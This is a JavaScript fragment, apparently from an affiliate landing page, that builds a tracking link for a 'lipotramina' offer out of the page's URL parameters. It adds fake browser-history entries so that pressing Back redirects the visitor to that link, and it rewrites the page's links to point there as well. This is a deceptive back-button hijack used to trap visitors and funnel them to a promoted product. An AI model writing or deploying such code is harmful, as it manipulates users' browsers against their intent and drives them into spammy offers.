...
function getParameterByName(name) {name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),results = regex.exec(location.search);return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));}var sub1 = getParameterByName('sub1');var sub2 = getParameterByName('sub2');var sub3 = getParameterByName('sub3');var fb = getParameterByName('fb');var convlink = 'https://trackerff.online/track/?offer=lipotramina&affid=4&lp=0&sub1='+sub1+'&sub2='+sub2+'&sub3='+sub3+'&fb='+fb;
history.pushState({}, "", location.href);history.pushState({}, "", location.href);window.onpopstate = function() {setTimeout(function() {location.href = convlink;}, 1);};for (var i = 0; i < anchors.length; i++) {anchors[i].href = convlink;}
